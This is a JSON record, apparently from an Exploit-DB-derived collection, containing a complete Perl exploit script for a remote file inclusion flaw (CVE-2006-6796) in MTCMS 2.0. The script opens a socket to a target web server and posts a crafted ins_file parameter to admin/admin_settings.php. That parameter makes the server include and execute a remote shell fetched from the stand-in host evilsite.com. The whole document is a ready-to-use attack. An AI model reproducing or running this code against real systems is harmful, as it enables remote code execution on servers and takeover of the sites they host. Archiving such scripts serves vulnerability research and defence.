{
  "id": "3005",
  "title": "MTCMS 2.0 - &#039;/admin/admin_settings.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6796",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n# +-------------------------------------------------------------------------------------------\r\n# + MTCMS <= 2.0 (admin/admin_settings.php) Remote File Include Exploit\r\n# +-------------------------------------------------------------------------------------------\r\n# + Affected Software .: MTCMS <= 2.0\r\n# + Vendor ............: http://www.mtcms.co.uk/\r\n# + Download ..........: http://mtcms.co.uk/downloads/index.php?file=MTCMS-V2.rar\r\n# + Description .......: \"MTCMS is a PHP/MySQL, Content Management System (CMS).\"\r\n# + Class .............: Remote File Inclusion\r\n# + Risk ..............: High (Remote File Execution)\r\n# + Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>\r\n# + Requirements.......: register_globals = on\r\n# +-------------------------------------------------------------------------------------------\r\n\r\nuse Getopt::Long;\r\nuse URI::Escape;\r\nuse IO::Socket;\r\n\r\n$remotefile = \"http://evilsite.com/shell.php\";\r\n\r\nmain();\r\n\r\nsub usage\r\n{\r\n    print \"\\nMTCMS <= 2.0 Remote File Include Exploit\\n\";\r\n    print \"nuffsaid <nuffsaid[at]newbslove.us>\\n\";\r\n    print \"-h, --host\\ttarget host\\t(example.com)\\n\";\r\n    print \"-f, --file\\tremote file\\t(http://evilsite.com/shell.php)\\n\";\r\n    print \"-d, --dir\\tinstall dir\\t(/mtcms)\\n\";\r\n    exit;\r\n}\r\n\r\nsub main\r\n{\r\n    GetOptions ('h|host=s' => \\$host,'f|file=s' => \\$file,'d|dir=s' => \\$dir);\r\n    usage() unless $host;\r\n    $remotefile = $file unless !$file;\r\n    $url = uri_escape($remotefile);\r\n    \r\n    $sock = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>\"80\")\r\n     or die \"\\nconnect() failed.\\n\";\r\n     \r\n    print \"\\nconnected to \".$host.\", sending data.\\n\";\r\n    $sendurl = \"inst=true&ins_file=\".$url.\"\";\r\n    $sendlen = length($sendurl);\r\n    print $sock \"POST \".$dir.\"/admin/admin_settings.php?b=addons&c=easy_add HTTP/1.1\\n\";\r\n    print $sock \"Host: \".$host.\"\\n\";\r\n    print $sock \"Connection: close\\n\";\r\n    print $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\n    print $sock \"Content-Length: \".$sendlen.\"\\n\\n\";\r\n    print $sock $sendurl;\r\n    print \"attempted to include remote file, server response:\\n\\n\";\r\n    while($recvd = <$sock>)\r\n    {\r\n        print \" \".$recvd.\"\";\r\n    }\r\n    exit;\r\n}\r\n\r\n# milw0rm.com [2006-12-25]",
  "url": "https://www.exploit-db.com/exploits/3005"
}